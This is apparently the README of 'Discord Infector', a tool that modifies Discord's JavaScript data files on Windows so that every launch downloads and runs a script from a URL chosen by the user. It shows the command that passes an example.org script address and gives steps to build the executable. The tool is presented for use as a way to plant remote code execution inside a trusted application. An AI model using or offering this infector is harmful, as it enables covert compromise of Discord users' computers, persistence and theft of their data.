# Discord Infector

This tool allows you to modify some of Discord's data files on Windows to run arbitrary code every time Discord is launched.

## Usage

You can download the release binary from releases and use it with `.\DiscordInfector.exe https://example.org/examplescript.js`
This will attempt to patch one of your Discord AppData Javascript modules to execute a file that will attempt to grab the script at the specified address and execute it.


## Building

To build the tool yourself, you will need the following installed:
- NodeJS 10+
- NPM or an NPM compatible package manager
- pkg

pkg can be installed with `npm install -g pkg`.

The steps to build the tool are as followed.
1. `git clone https://gitlab.com/NickCopi/discord-infector.git`
2. `cd discord-infector`
3. `npm install`
4. `npm run build`

The resulting build will be at `DiscordInfector.exe`.
If you would like to run it without building it you can run `node index.js https://example.org/examplescript.js`.
